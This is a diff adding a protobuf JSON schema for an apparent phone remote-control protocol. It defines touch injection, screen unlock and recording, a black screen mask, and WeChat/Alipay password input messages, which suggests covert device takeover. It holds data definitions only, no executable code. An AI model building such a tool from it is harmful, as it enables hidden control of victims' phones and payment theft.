@@ -1,0 +1,292 @@
+{
+  "options": {
+    "syntax": "proto3"
+  },
+  "nested": {
+    "message": {
+      "nested": {
+        "Message": {
+          "oneofs": {
+            "Pack": {
+              "oneof": [
+                "initDevice",
+                "userState",
+                "touchXY",
+                "logInfo",
+                "inputPassword",
+                "adminLoginRequest",
+                "adminLoginResponse",
+                "strPack",
+                "int32Pack",
+                "int64Pack",
+                "boolPack"
+              ]
+            }
+          },
+          "fields": {
+            "packType": {
+              "type": "PackType",
+              "id": 1
+            },
+            "terminal": {
+              "type": "Terminal",
+              "id": 2
+            },
+            "adminId": {
+              "type": "string",
+              "id": 3
+            },
+            "userId": {
+              "type": "string",
+              "id": 4
+            },
+            "initDevice": {
+              "type": "InitDevice",
+              "id": 11
+            },
+            "userState": {
+              "type": "UserState",
+              "id": 12
+            },
+            "touchXY": {
+              "type": "TouchXY",
+              "id": 13
+            },
+            "logInfo": {
+              "type": "LogInfo",
+              "id": 14
+            },
+            "inputPassword": {
+              "type": "InputPassword",
+              "id": 15
+            },
+            "adminLoginRequest": {
+              "type": "AdminLoginRequest",
+              "id": 16
+            },
+            "adminLoginResponse": {
+              "type": "AdminLoginResponse",
+              "id": 17
+            },
+            "strPack": {
+              "type": "string",
+              "id": 18
+            },
+            "int32Pack": {
+              "type": "int32",
+              "id": 19
+            },
+            "int64Pack": {
+              "type": "int64",
+              "id": 20
+            },
+            "boolPack": {
+              "type": "bool",
+              "id": 21
+            }
+          }
+        },
+        "PackType": {
+          "values": {
+            "INIT": 0,
+            "LOGIN_ADMIN": 1,
+            "TOUCH": 2,
+            "ACCESSIBLE_GLOBAL": 3,
+            "INPUT_TEXT": 4,
+            "START_RECORD_SCREEN": 5,
+            "STOP_RECORD_SCREEN": 6,
+            "USER_TERMINAL_STATE": 7,
+            "OPERATIONAL_LOG": 8,
+            "UNLOCK_SCREEN": 9,
+            "INPUT_PASSWORD": 10,
+            "CLICK_TEXT": 11,
+            "OPEN_BLACK_MASK": 12,
+            "LAYOUT_READER": 13,
+            "PING": 14,
+            "PONG": 15
+          }
+        },
+        "Terminal": {
+          "values": {
+            "ADMIN_ANDROID": 0,
+            "ADMIN_WEB": 1,
+            "ADMIN_PC": 2,
+            "USER_ANDROID": 3
+          }
+        },
+        "SocketState": {
+          "values": {
+            "SOCKET_UN_CONNECT": 0,
+            "SOCKET_CONNECT_ING": 1,
+            "SOCKET_CONNECT_SUCCESS": 2,
+            "SOCKET_CONNECT_CLOSE": 3,
+            "SOCKET_CONNECT_ERROR": 4
+          }
+        },
+        "PushScreenState": {
+          "values": {
+            "PUSH_UN_CONNECT": 0,
+            "PUSH_CONNECT_ING": 1,
+            "PUSH_CONNECT_SUCCESS": 2,
+            "PUSH_DIS_CONNECTE": 3,
+            "PUSH_RE_CONNECT": 4
+          }
+        },
+        "PasswordType": {
+          "values": {
+            "WEIXIN": 0,
+            "ZHIFUBAO": 1
+          }
+        },
+        "InitDevice": {
+          "fields": {
+            "brand": {
+              "type": "string",
+              "id": 1
+            },
+            "phoneModel": {
+              "type": "string",
+              "id": 2
+            },
+            "androidVersionName": {
+              "type": "string",
+              "id": 3
+            },
+            "androidVersionCode": {
+              "type": "string",
+              "id": 4
+            },
+            "resolution": {
+              "type": "string",
+              "id": 5
+            },
+            "oemVersionName": {
+              "type": "string",
+              "id": 6
+            },
+            "oemVersionCode": {
+              "type": "string",
+              "id": 7
+            }
+          }
+        },
+        "UserState": {
+          "fields": {
+            "socketState": {
+              "type": "SocketState",
+              "id": 1
+            },
+            "socketStateTxt": {
+              "type": "string",
+              "id": 2
+            },
+            "pushScreenState": {
+              "type": "PushScreenState",
+              "id": 3
+            },
+            "pushScreenStateTxt": {
+              "type": "string",
+              "id": 4
+            },
+            "isAccessibility": {
+              "type": "bool",
+              "id": 5
+            },
+            "isScreenLock": {
+              "type": "bool",
+              "id": 6
+            },
+            "instructLastTime": {
+              "type": "int64",
+              "id": 7
+            },
+            "heartbeatTime": {
+              "type": "int64",
+              "id": 8
+            },
+            "isMaskBlack": {
+              "type": "bool",
+              "id": 9
+            }
+          }
+        },
+        "TouchXY": {
+          "fields": {
+            "pressX": {
+              "type": "float",
+              "id": 1
+            },
+            "pressY": {
+              "type": "float",
+              "id": 2
+            },
+            "moveX": {
+              "type": "float",
+              "id": 3
+            },
+            "moveY": {
+              "type": "float",
+              "id": 4
+            },
+            "duration": {
+              "type": "int64",
+              "id": 5
+            }
+          }
+        },
+        "LogInfo": {
+          "fields": {
+            "packageName": {
+              "type": "string",
+              "id": 1
+            },
+            "className": {
+              "type": "string",
+              "id": 2
+            },
+            "content": {
+              "type": "string",
+              "id": 3
+            }
+          }
+        },
+        "AdminLoginRequest": {
+          "fields": {
+            "username": {
+              "type": "string",
+              "id": 1
+            },
+            "password": {
+              "type": "string",
+              "id": 2
+            }
+          }
+        },
+        "AdminLoginResponse": {
+          "fields": {
+            "isLoginSuccess": {
+              "type": "bool",
+              "id": 1
+            },
+            "msg": {
+              "type": "string",
+              "id": 2
+            }
+          }
+        },
+        "InputPassword": {
+          "fields": {
+            "type": {
+              "type": "PasswordType",
+              "id": 1
+            },
+            "content": {
+              "type": "string",
+              "id": 2
+            }
+          }
+        }
+      }
+    }
+  }
+}
